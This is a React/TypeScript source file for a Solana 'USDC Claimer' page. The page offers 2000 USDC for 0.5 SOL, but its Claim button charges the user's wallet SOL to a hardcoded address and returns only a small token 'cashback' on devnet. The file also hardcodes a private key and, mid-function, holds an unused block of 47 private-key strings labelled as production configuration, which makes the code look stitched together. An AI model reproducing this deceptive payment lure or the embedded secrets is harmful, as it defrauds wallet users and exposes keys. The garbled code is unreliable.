/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "u2JadtDonvBbpRHNnK66nR32kXyumzHqiYSm6xdGoJHwMc5cA4MsBjTB3LTECuYSo2hhNTTn3hCdGYApE1QZMi2"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2e5S73b27jxS918FuzM2kF2yGAjdCwVppBhWdR5MLHz52MERCqctKy3ZmMu9N3YQ9wGg48vLUrZkEDgqLhB8RcBG",
  "key1": "4vcYGRVTZm2d8HkACqs8nV5RL7k2c895f8UVJeJw2v179Wk7GgYaSPh3kU6cvNvk1PycN1VeiQ3ZdUmRbKTDJHXM",
  "key2": "4wNtnouSJKF6Jattw3GL4WeJ8yZn2pgRsDR9dtzWrDBHnYVNBzMr1DpTLxKVrC3Ty7JZ8uyLCT5bbuWt1C2jxkef",
  "key3": "myhvCPLsQrNYCpb5rcmit9wpi7ws8c8jnunTgy2Uan7i8x9L71FcUDowZypEHrYAGEoUakWuRViExarhCz6spPN",
  "key4": "3gayoMBkNoFUxdmc6sSsdWA4hhiR3smaoC8Y88xB7rGFApeCF9NWL5vauii8ouWvnhnU3tXEuSFwLSTCamW43rU1",
  "key5": "379F9WLCrBBTwgM6Zd93KGMrtvn1nWuv6xTiaYj4LZmj8gg7qpyfzJJsLXcSm9SyCZvdib6wbFC5LW5dTXyTFUzi",
  "key6": "3HHq2Rbo59P9xL3WHp26VNwuAA5yXHbDRCAzm8Av74AvwgNevfwu9HKQ6cf7KDiPVijQ3EUaahMm83sTxG41hjGv",
  "key7": "549y5WdT9NihzsRNiANWQV7QLqesbsSiTDH29ihwAq6j3MDMvnCuqL2yKBoM3GPpBZTSyDJLBAG28gHHEHG9qNWY",
  "key8": "66zxSjZ3VXh2PgCCLq5QFBEjXw5WMeAR1UFUhUwtx7988b25rQxJUzUukJ1BbuT36UmoVkDNm3DqH6LEsDe6jUZn",
  "key9": "f1JYJyuhHNexjveaQ5xfSzuBx4W14Akh3QMZo75Mk1VL5j2yCzQyTPQVkCk7rNxbFn3pdbRkFYDBDKE3Chqsf7o",
  "key10": "YPiEJH4e5868SaU1jLZ9GpJj34jfcRTiinxWmaWgicyP77jMajaFceMw5uEvAqvkcgtFsJsEWB1GSekxuxm4KK7",
  "key11": "51bAdrFWKLMSYCTHYzDaEJ8yKUv1jp9xfbuKi4gxJrZYW2JtbQP2Z6dZ3oNUx42QVyajThTYBUGCZ2EcW4Uy7B4d",
  "key12": "5FbCFAM3nVaPNfGMAXvUqRSBL4XRbCvfDdjck3RGJ5nzevoXR1HVXKWHZaiG1mg9ARRSWu47fnXPDGxxxkd8CVxq",
  "key13": "MCRqedNu81oqjUfxZA9mZv57Kfm9KKB2hBH3WAqwCcT1HoDNfe32rUHqFaDTLynfz6vM2BfmcCfmvbM6vX5sEAf",
  "key14": "4e8iMqhEQ2VQo7qgVv3bzRj4atv91Uteuzq1qDrigYpQ2pR2UA489VU5AdebWjPMwRmiF9E9imyBJfSWw8FzRcr5",
  "key15": "y4NFq77spJHFozyeDPCJFgCyqdXapQneYYAjEKzyZeWSb2osbqbnG4rCDjTHa4sxiVapjcMRLY5eiKLzots3UR3",
  "key16": "5FM8SdYDkbNM4S2VqXmD9C8h6uDz7bXcrV4DU2gXS7iE3HYWFHMsaeWFwz3xzTXtE91hRK9iLuvTkDUQeHm2Tdnm",
  "key17": "2g9g775RHzFcfotKuyZ4omaCvyvVpZb4DgJimC2afEiyncvac8cjeSCpnYgc8bdZzFUncPtXyJXUoK1Ko94X6Wrq",
  "key18": "zJNfWKU6beQ6hFYiTfYztNk5KNMUjamAtrB15od7Arom4LZB3yJ8bK6KQNpnaqJj4UEYDVW2xun6sNyQzdxZECo",
  "key19": "3TcPmZUR8vNLMSebeJQsKoYhss8zexoR74MppQqoRNoR4NQppGa9uiPgWaoCBKdDmhvxkyoVsDytGh8j5DQYsS18",
  "key20": "4okUwijRNoUnSJeB4Bu1ywA5q96GrbzyfhFfNXTFpahzqg7fUrtr2LFysnbo2yRrMkeed92xyvxQXRenHQY64hJ5",
  "key21": "5sY21cYmQ3U7NW9TACtmR9qSbNQh2mmAmVEaUYamwBwscjDJc2d5q8vcwASE6DC59LMmNrgUtVPe1tuxaRNjsePk",
  "key22": "feoXpNnUGFJDd4hgXUEay8VYzBYbDExFHuM7appsiPgHH3c3xhkYE7kpjMcnX5N5WmjpnxyWNNFYHaVd6Jh5Bqh",
  "key23": "3nKP8Gomq2xagyNkmbvwDfdVarwgu91vBR39y2qw5cZ2sK7yfEZaPER4AikTeg2cHhFvgKisi7AHkxJ4zsWk84ED",
  "key24": "4dkgW5SMCfEUdebeXESAiPHVx2dvWrXTQeH39KFruSJiYg1ddSiruwfSGBZJHstDYCtdVw6xpdS1Ev27mHnkkti8",
  "key25": "4FwMvDxATkJSikc7zMYojo8UzRtgZXFkmRjHoWnVpn56eikVQjtYH5pwS2K9QAbxt7SXfFAnFQgapw4jnbqeSHgP",
  "key26": "39LW1ZkB6vYXcxQGUCqiw4qBJVRTvHt7d2kJKgbyQ74ZKH2hzXDrxFHqSBeDa7w53ktkWGzujVecTpeFCo7NVPGd",
  "key27": "4dstz1ZJjHm55dD1gYZwdVYPoQnANzyuPXnN92KpZVh7hipzHtpcajMZLeuuFXdZr2LFdAGDjMtD8bWqh1BT5wGG",
  "key28": "64ZHLgDX78rXZv5N8z6DEJxF51uxUhL3tzVntjUXrc6PSiUo99kiUZkLL2CGAjTWeBfyCCLAVPJaq9BBo9KDh5jp",
  "key29": "2Vjz3YX9V1Se64XVzTQtPukCSUSJKPRgu7LQcciX2yrDpFVEUULKxMZdZd4UCztCgnmBXEU4JL9V6ct7CZPRpTdR",
  "key30": "hiAebE4wKrFNyWUMSEKGLu7FgTPxo7TS71AEprEhMTkbKs8oufNhb1Yy1csgepi4vSiwvbpthRAc3P3iew1kAtn",
  "key31": "4BVUSyqxzeuqcq2pDwXC2KTrRUxPjUgmcQkdff21UZ6xw85dyCuuANftkTUxRenov4y78JtfZZp5iJvmFo62GvfB",
  "key32": "45fLC6fUhkNunWiY69JjtktQmQzvJTN3iiueWbxihLoS7hqasWwVxo2udsRuK1zLRCKudmZtL6JeAMdTXdqhyV2h",
  "key33": "3mGYWzDxextHuRwaJHMTxgoi8LCDfV8miwvYCjTnw8xCSxapwgRE4rvrwVmmeyyyRCQJBZjHXNAhyH6r3qx4gJa2",
  "key34": "5bbY21nQzJ7XWzCy9SfWmSxmKdiRnh6q6J6NjEch3eK9GHjB7oTWuc8MNCtAtGo3B8RzkkZ1PFusykSKaK97dmwR",
  "key35": "4HewkdmWDQPp8F7UGCDQvVuUvJSbQA43KYJnjGhf3FycXZnfyurFmHFDjCLjsKx5T2VWQmrejGxf4S6fFK9Pop9T",
  "key36": "4vCQ5mfLhADDXHmf9GBzq5NSBpMwxVwcexfoX3doAfR3fpH2H8z8qYZLcnW5WN8qdCbVNtpuBE3xdh198wBwikij",
  "key37": "3xFy4V6fGQMwZyLTDwZnnG3jTeVrawPJ9SbnqVkT8GoYYauUCTKU3bqyz8Bo3eb2djtusV4AeRD6ypEnafsadayu",
  "key38": "xZcttxxuTXmhMRv3qenPKXZ55HQzaXs1NCJHvssr4NHnhaKD9dZyQHKzUUhr9nJHppqy4sMhsEDug29VzPhMuRD",
  "key39": "3bB4xRtivoLrpczJt15PoXhmNuKiLZqvSov9E8SMAhp2LdNK2NFzjtL7ZKcH7GpqLZxvQeDJiWbjiGmNJUNm2nMu",
  "key40": "2YNE2ctoSuiZSoTVCZTq2MmrQRevK3pZQwpQ3v8TnT1oWCf3QEj7PLRSZLKTFy2s8cE1VSZKY82GV2W1LRo4JRDe",
  "key41": "364RRQ7krtK5pySTVh7XS12Yo3HojXufoYLHa7GF3nFDL6ZsnmdfwbxekaVqw1gdWVFpE5gnTpvU9R2xwnVVzjJ9",
  "key42": "3E6xTxF1viTCGRsT1GNSKZx7WM5dFaNnk4buifNznGhmV1hDbWBdu19oQPQTKhKaXmHjwk3UJMomUZdUA8xkG7yT",
  "key43": "XM8Aquv7nFcv8aHs3RAKVBpP4oSkidzPNF6S6CRdZ4Bp6wuk3KTdaf1BtvNv36p7JJbHb7wn5sSgC2QCv4VshkL",
  "key44": "5s7HNrfbhbJUYhJEd3tbXbNyVTQ2demdkhKaZChNLzg2ynuaFmsyr6hphciy7ScyTswgtrQKU7eZDjWNtZfSFaXu",
  "key45": "4MTTSTe4bGaJneWDMGEJhiNgfRySVW7Na1HoKCNpN3SaF3voq8hhhk33xznCWexcE3oXrWrTitjhaA8buYiJosTu",
  "key46": "4XzZLJnS9ja3Pzr4YauB5n4fFSiH2RLkWkwERaVtFCAvhFyhwoZwu3zJrdq2k7iJ6rNafz45YEDjE5KpaSXc1BV"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
